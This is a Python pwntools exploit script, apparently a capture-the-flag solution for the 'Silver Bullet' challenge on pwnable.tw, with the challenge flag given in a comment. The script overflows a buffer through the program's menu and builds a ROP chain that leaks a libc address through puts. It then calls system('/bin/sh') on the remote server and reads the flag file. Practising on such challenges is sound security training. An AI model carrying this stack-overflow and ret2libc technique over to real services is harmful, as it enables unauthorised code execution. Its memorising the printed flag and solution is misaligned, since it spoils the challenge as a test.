#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}

host = 'chall.pwnable.tw'
port = 10103
y = remote(host,port)

l = ELF('libc_32.so.6')

puts_plt = 0x80484a8
read_got = 0x804afd0
main = 0x8048954

def cre(des):
    y.sendafter(':','1\n')
    y.sendafter(':',des + '\n')
    sleep(1)

def up(des):
    y.sendafter(':','2\n')
    y.sendafter(':',des + '\n')
    sleep(1)

def bea():
    y.sendafter(':','3\n')
    sleep(1)


cre('a'*47)
up('a')

p = 'a' * 7
p += p32(puts_plt)
p += p32(main)
p += p32(read_got)

up(p)
bea()
bea()
y.recvuntil('Oh ! You win !!\n')

read_ad = u32( y.recv(77)[:4] )

libc_base = read_ad - l.symbols['read']
system  = libc_base + l.symbols['system']
bsh = libc_base + l.search('/bin/sh').next()

cre('a'*47)
up('a')

p = 'a' * 7
p += p32(system)
p += p32(main)
p += p32(bsh)

up(p)
bea()
bea()

y.sendline('cat /home/`whoami`/flag')

y.interactive()
